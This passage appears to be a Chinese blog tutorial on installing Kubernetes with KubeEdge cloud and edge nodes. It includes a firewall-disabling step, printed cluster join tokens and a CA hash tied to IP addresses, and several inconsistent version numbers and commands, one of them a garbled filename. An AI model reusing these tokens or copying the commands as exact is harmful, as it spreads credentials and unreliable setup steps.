class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop ufw</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> ufw</span><br></pre></td></tr></table></figure><p>所有主机禁用swap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/fstab</span><br><span class="line"><span class="comment"># 注释swap那一行</span></span><br><span class="line">sudo swapon -a <span class="comment"># 启用所有swap</span></span><br><span class="line">sudo swapoff -a <span class="comment"># 禁用所有swap</span></span><br><span class="line">sudo swapon -s <span class="comment"># 查看swap状态</span></span><br></pre></td></tr></table></figure><p>所有主机设置时间同步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y ntpdate</span><br><span class="line">sudo ntpdate time.windows.com</span><br><span class="line">sudo timedatectl set-timezone Asia/Shanghai</span><br></pre></td></tr></table></figure><p>所有节点添加hosts</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加hosts</span></span><br><span class="line">sudo vi /etc/hosts</span><br><span class="line"><span class="comment"># 加入如下几行</span></span><br><span class="line">10.0.1.200     master</span><br><span class="line">192.168.0.201    node1</span><br><span class="line">192.168.0.202    node2</span><br><span class="line">192.168.0.203    node3</span><br><span class="line">185.199.108.133 raw.githubusercontent.com</span><br></pre></td></tr></table></figure><p>启用ipv4转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/sysctl.conf</span><br><span class="line"><span class="comment"># 注释下面行</span></span><br><span class="line">/etc/sysctl.conf: net.ipv4.ip_forward = 1</span><br><span class="line">sudo sysctl -p /etc/sysctl.conf</span><br></pre></td></tr></table></figure><h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><p>我们选择安装docker.io ubuntu的版本，省事</p><p><strong>记住，需要在所有4台节点上都安装docker</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure><p>docker官方镜像仓库访问比较慢，可以使用dockerhub国内源加速</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://knjsrl1b.mirror.aliyuncs.com&quot;</span>,<span class="string">&quot;https://docker.hub.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="comment"># 阿里云镜像加速 https://knjsrl1b.mirror.aliyuncs.com</span></span><br><span class="line"><span class="comment"># 中科大镜像加速 https://docker.mirrors.ustc.edu.cn</span></span><br><span class="line"><span class="comment"># 云节点加入&quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span></span><br><span class="line"><span class="comment"># 边缘节点默认cgroupfs就行了，和kubeedge一致</span></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="主机安装Kubernetes"><a href="#主机安装Kubernetes" class="headerlink" title="主机安装Kubernetes"></a>主机安装Kubernetes</h2><p>考虑到兼容性，我们选择kubernetes1.23.17进行安装</p><p>根据阿里云的<a href="https://developer.aliyun.com/mirror/kubernetes">教程</a>，在<strong>1台云主机上</strong>，使用阿里源安装kubelet，kubeadm和kubectl组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; apt-get install -y apt-transport-https</span><br><span class="line">sudo curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | sudo apt-key add -</span><br><span class="line">sudo vim /etc/apt/sources.list.d/kubernetes.list</span><br><span class="line"><span class="comment"># 输入以下内容：</span></span><br><span class="line">deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main</span><br><span class="line">sudo apt update</span><br><span class="line"><span class="comment"># 可先使用apt list kubelet -a 查看所有版本，再指定版本</span></span><br><span class="line">sudo apt install -y kubelet=1.23.17-00 kubeadm=1.23.17-00 kubectl=1.23.17-00</span><br></pre></td></tr></table></figure><p>在云master主机上使用kubeadm创建kubernetes集群，这里我们使用阿里云的镜像进行加速，这里kubeadm会安装和自己版本匹配的kubernetes</p><p>如果主机的IP就是公网IP，那么初始化如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo kubeadm init \</span><br><span class="line">  --apiserver-advertise-address=192.168.132.100 \</span><br><span class="line">  --image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">  --service-cidr=10.96.0.0/12 \</span><br><span class="line">  --pod-network-cidr=10.244.0.0/16</span><br></pre></td></tr></table></figure><p>如果云的服务器的公网IP在主机上看不到，因此这里选择让apiserver监听所有网卡的地址，并且添加额外的公网IP作为认证许可的IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo kubeadm init \</span><br><span class="line">  --apiserver-advertise-address=0.0.0.0 \</span><br><span class="line">  --apiserver-cert-extra-sans=139.9.72.62 \</span><br><span class="line">  --image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">  --service-cidr=10.96.0.0/12 \</span><br><span class="line">  --pod-network-cidr=10.244.0.0/16</span><br></pre></td></tr></table></figure><p>执行完毕会输出很多提示指令需要我们执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Your Kubernetes control-plane has initialized successfully!</span><br><span class="line"></span><br><span class="line">To start using your cluster, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">  sudo <span class="built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line">  sudo <span class="built_in">chown</span> $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) <span class="variable">$HOME</span>/.kube/config</span><br><span class="line"></span><br><span class="line">Alternatively, <span class="keyword">if</span> you are the root user, you can run:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">export</span> KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line"></span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run <span class="string">&quot;kubectl apply -f [podnetwork].yaml&quot;</span> with one of the options listed at:</span><br><span class="line">  https://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">Then you can <span class="built_in">join</span> any number of worker nodes by running the following on each as root:</span><br><span class="line"></span><br><span class="line">kubeadm <span class="built_in">join</span> 192.168.132.100:6443 --token 20vasa.tus6j1y6edbm6e1i \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:830a4e14fdecfb8c9eb7143fe44a1abb8bc68956d959b55447b2e7a1d6e61d85</span><br></pre></td></tr></table></figure><p>我们按照提示在普通用户和root用户下都执行一次，这样kubectl就可以访问到本地的kube-api-server了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">  sudo <span class="built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line">  sudo <span class="built_in">chown</span> $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) <span class="variable">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure><p>我们接着安装CNI网络插件，下载太慢了可以使用这个<a href="https://ipaddress.com/website/raw.githubusercontent.com">网站</a>查询raw.githubusercontent.com的IP地址并且写入hosts文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br><span class="line">vi kube-flannel.yml</span><br><span class="line"><span class="comment"># kubectl edit -n kube-flannel daemonset.apps/kube-flannel-ds</span></span><br><span class="line">......<span class="comment"># 修改下面的affinity亲和性，增加一个key使其不部署于边缘节点</span></span><br><span class="line">- key: node-role.kubernetes.io/edge</span><br><span class="line">                  operator: DoesNotExist</span><br><span class="line">......</span><br><span class="line">kubectl apply -f kube-flannel.yml</span><br></pre></td></tr></table></figure><p>执行 <code>kubectl get pods -n kube-flannel</code>如果出现如下说明网络插件安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">kube-flannel-ds-hgn9l            1/1     Running   0          44m</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>让master也作为工作节点可以运行用户Pod</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl taint node master node-role.kubernetes.io/master-</span><br></pre></td></tr></table></figure><p>让master不参与运行用户Pod</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl taint node master node-role.kubernetes.io/master=:NoSchedule</span><br></pre></td></tr></table></figure><p>过一会，在master主机上执行 <code>kubectl get nodes</code>，如下则加入成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl get nodekub</span><br><span class="line">NAME     STATUS   ROLES                  AGE   VERSION</span><br><span class="line">master   Ready    control-plane,master   13m   v1.22.15</span><br></pre></td></tr></table></figure><p>在 Kubernetes 集群中创建一个 pod，验证是否正常运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kubectl create deployment nginx --image=nginx</span><br><span class="line">kubectl expose deployment nginx --port=80 --<span class="built_in">type</span>=NodePort</span><br><span class="line">kubectl get pod,svc</span><br><span class="line">NAME                         READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod/nginx-6799fc88d8-hf2m9   1/1     Running   0          22s</span><br><span class="line"></span><br><span class="line">NAME                 TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE</span><br><span class="line">service/kubernetes   ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP        14m</span><br><span class="line">service/nginx        NodePort    10.104.74.138   &lt;none&gt;        80:31332/TCP   8s</span><br></pre></td></tr></table></figure><p>可以看到nginx暴露的端口号为31332，因此我们访问地址：<a href="http://39.106.4.225:31332可以成功访问nginx首页">http://39.106.4.225:31332可以成功访问nginx首页</a></p><p><a href="http://192.168.80.128:31017/">http://192.168.80.128:31017</a></p><h2 id="安装KubeEdge"><a href="#安装KubeEdge" class="headerlink" title="安装KubeEdge"></a>安装KubeEdge</h2><p>kubeEdge和kubernetes类似，提供了keadm工具用来快速搭建kubeedge集群，我们可以提前在KubeEdge的github官网上面下载keadm1.12.2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/kubeedge/kubeedge/releases/download/v1.13.1/keadm-v1.13.1-linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p><strong>在每个节点上</strong>安装keadm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf keadm-v1.12.2-linux-长度amd64.tar.gz</span><br><span class="line">sudo <span class="built_in">mv</span> keadm-v1.12.2-linux-amd64/keadm/keadm /usr/bin/</span><br></pre></td></tr></table></figure><h3 id="云端安装"><a href="#云端安装" class="headerlink" title="云端安装"></a>云端安装</h3><p>使用keadm安装kubeedge的云端组件cloudcore</p><p>如果速度慢可以提前拉取cloudcore镜像</p><p>sudo docker pull kubeedge&#x2F;cloudcore:v1.13.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo keadm init --advertise-address=192.168.43.118 --profile version=v1.13.1</span><br><span class="line"><span class="comment"># 这些参数已经没有用了 --set cloudcore-tag=v1.13.0 --kubeedge-version=1.13.0</span></span><br><span class="line">Kubernetes version verification passed, KubeEdge installation will start...</span><br><span class="line">CLOUDCORE started</span><br><span class="line">=========CHART DETAILS=======</span><br><span class="line">NAME: cloudcore</span><br><span class="line">LAST DEPLOYED: Thu Nov  3 11:05:24 2022</span><br><span class="line">NAMESPACE: kubeedge</span><br><span class="line">STATUS: deployed</span><br><span class="line">REVISION: 1</span><br></pre></td></tr></table></figure><p>–advertise-address&#x3D;xxx.xx.xx.xx 这里的xxx.xx.xx.xx换成云主机的公网地址，–profile version&#x3D;v1.12.1 意思是指定安装的kubeEdge的版本，如果默认不指定那么keadm会自动去下载最新的版本</p><p>注意，这个命令会从仓库下载cloudcore容器镜像</p><p>我们可以看到cloudcore的Pod和service已经在运行了，cloudcore会监听本地的10000-10004端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pod,svc -n kubeedge</span><br><span class="line">NAME                             READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod/cloudcore-5768d46f8d-fqdcn   1/1     Running   0          78s</span><br><span class="line"></span><br><span class="line">NAME                TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)                                             AGE</span><br><span class="line">service/cloudcore   ClusterIP   10.99.61.17   &lt;none&gt;        10000/TCP,10001/TCP,10002/TCP,10003/TCP,10004/TCP   78s</span><br></pre></td></tr></table></figure><p>获得边缘设备接入的token</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo keadm gettoken</span><br><span class="line">0825d1d733ec84877374418cc4ecd379501efe7fe1c778e91022367c834a22a6.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTM0NDg5NzV9.ws0B17aZrvhSL0mu1FEVElnewTFGrh5MNn_4reBgbNA</span><br></pre></td></tr></table></figure><h3 id="边缘节点安装"><a href="#边缘节点安装" class="headerlink" title="边缘节点安装"></a>边缘节点安装</h3><p>可以提前拉取镜像（提前拉取没有用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull kubeedge/installation-package:v1.13.0</span><br></pre></td></tr></table></figure><p>加入集群，keadm会安装edgecore和mqtt协议的实现软件mosquitto，mosquitto会监听localhost:1183端口</p><p>1.12</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo keadm <span class="built_in">join</span> --cloudcore-ipport=192.168.43.117:10000 --kubeedge-version=1.12.2 --token=f17ab9d16aa9b82249d2242101759e257e44970f58b347e61155ea0c34f836a4.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NzY4MTc5ODF9.60yCItWyPoNJrIjEBZxNzcQlqTQuiLYkF3Ky9zQ16Ps</span><br></pre></td></tr></table></figure><p>由于1.13版本默认容器运行时为containerd，可手动指定runtimetype为docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo keadm <span class="built_in">join</span> --cloudcore-ipport=192.168.43.118:10000 --kubeedge-version=1.13.1 --runtimetype=docker --token=0825d1d733ec84877374418cc4ecd379501efe7fe1c778e91022367c834a22a6.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTM0NDg5NzV9.ws0B17aZrvhSL0mu1FEVElnewTFGrh5MNn_4reBgbNA</span><br></pre></td></tr></table></figure><p><code>--cloudcore-ipport</code>是边缘节点能访问的云master主机的IP端口号，<code>--token</code>是上面云matster生成的识别码</p><p>安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">W1024 13:10:08.370505    4423 validation.go:71] NodeIP is empty , use default ip <span class="built_in">which</span> can connect to cloud.</span><br><span class="line">I1024 13:10:08.371425    4423 join.go:100] 9. Run EdgeCore daemon</span><br><span class="line">I1024 13:10:08.822777    4423 join.go:317] </span><br><span class="line">I1024 13:10:08.822789    4423 join.go:318] KubeEdge edgecore is running, For logs visit: journalctl -u edgecore.service -xe</span><br></pre></td></tr></table></figure><p>如果通过 <code>sudo systemctl status edgecore</code>发现服务失败，使用 <code>journalctl -u edgecore.service -xe</code>查看日志</p><p>在master上查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@master:~<span class="comment"># kubectl get node</span></span><br><span class="line">NAME        STATUS   ROLES                  AGE    VERSION</span><br><span class="line">edgenode1   Ready    agent,edge             10m    v1.22.6-kubeedge-v1.12.0</span><br><span class="line">edgenode2   Ready    agent,edge             5m8s   v1.22.6-kubeedge-v1.12.0</span><br><span class="line">edgenode3   Ready    agent,edge             2s     v1.22.6-kubeedge-v1.12.0</span><br><span class="line">master      Ready    control-plane,master   47m    v1.22.15 </span><br></pre></td></tr></table></figure><h2 id="配置kubectl-logs支持边缘节点"><a href="#配置kubectl-logs支持边缘节点" class="headerlink" title="配置kubectl logs支持边缘节点"></a>配置kubectl logs支持边缘节点</h2><p>边缘部署一个Nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kubectl create deployment nginx --image=nginx -oyaml --dry-run=client &gt; nginx.yaml</span><br><span class="line">vi nginx.yaml</span><br><span class="line"><span class="comment"># 在spec-spec中加入边缘亲和性</span></span><br><span class="line">  affinity:</span><br><span class="line">        nodeAffinity:</span><br><span class="line">          requiredDuringSchedulingIgnoredDuringExecution:</span><br><span class="line">            nodeSelectorTerms:</span><br><span class="line">            - matchExpressions:</span><br><span class="line">              - key: node-role.kubernetes.io/edge</span><br><span class="line">                operator: In</span><br><span class="line">                values: [<span class="string">&quot;&quot;</span>]</span><br><span class="line">kubectl apply -f nginx.yaml</span><br><span class="line">(需要首先修改端口号，在~/.kube/config文件中，将端口号修改一下)</span><br><span class="line">kubectl expose deployment nginx --port=80 --<span class="built_in">type</span>=NodePort</span><br><span class="line">kubectl get pod,svc</span><br></pre></td></tr></table></figure><p>可以看到nginx暴露的端口号为30865，因此我们在任意边缘节点访问地址：<code>curl http://node2:30865</code>可以成功访问nginx首页</p><p>这样默认搭建好的kubeedge不支持在master查看边缘节点logs，会有如下的报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs nginx-597c67fd4d-kx44m</span><br><span class="line">Error from server: Get <span class="string">&quot;https://192.168.40.10:10350/containerLogs/default/nginx-597c67fd4d-kx44m/nginx&quot;</span>: dial tcp 192.168.40.10:10350: i/o <span class="built_in">timeout</span></span><br></pre></td></tr></table></figure><p>参考官方文档教程<a href="https://kubeedge.io/zh/docs/setup/keadm_zh/">使用Keadm进行部署 | KubeEdge一个支持边缘计算的开放平台</a></p><p>kube-proxy默认和kubeedge不兼容，因此我们考虑在边缘端移除kube-proxy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl edit daemonsets.apps -n kube-system kube-proxy</span><br></pre></td></tr></table></figure><p>我们修改kube-proxy的节点亲和性，使其不存在于边缘节点</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Please edit the object below. Lines beginning with a &#x27;#&#x27; will be ignored,</span></span><br><span class="line"><span class="comment"># and an empty file will abort the edit. If an error occurs while saving this file will be</span></span><br><span class="line"><span class="comment"># reopened with the relevant failures.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">deprecated.daemonset.template.generation:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="string">&quot;2022-06-20T12:43:20Z&quot;</span></span><br><span class="line">  <span class="attr">generation:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kube-proxy</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-proxy</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;92283&quot;</span></span><br><span class="line">  <span class="attr">uid:</span> <span class="string">39dd85f5-8d7f-47ff-83b4-59df66de7803</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">revisionHistoryLimit:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">k8s-app:</span> <span class="string">kube-proxy</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">k8s-app:</span> <span class="string">kube-proxy</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">affinity:</span> <span class="comment"># 在这里加入亲和性</span></span><br><span class="line">        <span class="attr">nodeAffinity:</span></span><br><span class="line">          <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span></span><br><span class="line">            <span class="attr">nodeSelectorTerms:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">matchExpressions:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/edge</span></span><br><span class="line">                  <span class="attr">operator:</span> <span class="string">DoesNotExist</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">command:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/usr/local/bin/kube-proxy</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--config=/var/lib/kube-proxy/config.conf</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--hostname-override=$(NODE_NAME)</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">        <span class="string">......</span></span><br></pre></td></tr></table></figure><p>此时我们在云master上看系统的pod组件，发现边缘的kube-proxy已经消失了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pod -n kube-system -owide</span><br></pre></td></tr></table></figure><p>因为flannel不支持边缘环境，无法在边缘运行，等下使用edgemesh见<a href="https://github.com/kubeedge/kubeedge/issues/2287">issue2287</a>，同样修改flannel的亲和性，使其不在边缘运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新部署flannel</span></span><br><span class="line">kubectl delete daemonset.apps/kube-flannel-ds -nkube-flannel</span><br><span class="line">wget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br><span class="line">vi kube-flannel.yml</span><br><span class="line"><span class="comment"># kubectl edit -n kube-flannel daemonset.apps/kube-flannel-ds</span></span><br><span class="line">......<span class="comment"># 修改下面的affi亲和性</span></span><br><span class="line">- key: node-role.kubernetes.io/edge</span><br><span class="line">                  operator: DoesNotExist</span><br><span class="line">......</span><br><span class="line"><span class="comment"># 重新部署</span></span><br><span class="line">kubectl apply -f kube-flannel.yml</span><br><span class="line"><span class="comment"># 再看，只有云主机上有运行了</span></span><br><span class="line">kubectl get all -nkube-flannel -owide </span><br></pre></td></tr></table></figure><p>查看Kubernetes 的 <code>ca.crt</code> 和 <code>ca.key</code> 文件都存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /etc/kubernetes/pki</span><br><span class="line">apiserver.crt              apiserver.key                 ca.crt  front-proxy-ca.crt      front-proxy-client.key</span><br><span class="line">apiserver-etcd-client.crt  apiserver-kubelet-client.crt  ca.key  front-proxy-ca.key      sa.key</span><br><span class="line">apiserver-etcd-client.key  apiserver-kubelet-client.key  etcd    front-proxy-client.crt  sa.pub</span><br></pre></td></tr></table></figure><p>在云端节点为CloudStream生成证书，其中 <code>certgen.sh</code>在kubeedge源码中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">wget https://github.com/kubeedge/kubeedge/archive/refs/tags/v1.13.1.tar.gz</span><br><span class="line">tar -xf v1.13.1.tar.gz</span><br><span class="line"><span class="built_in">mkdir</span> /etc/kubeedge</span><br><span class="line"><span class="built_in">cp</span> kubeedge-1.13.1/build/tools/certgen.sh /etc/kubeedge/</span><br><span class="line"><span class="built_in">cd</span> /etc/kubeedge/</span><br><span class="line">sudo 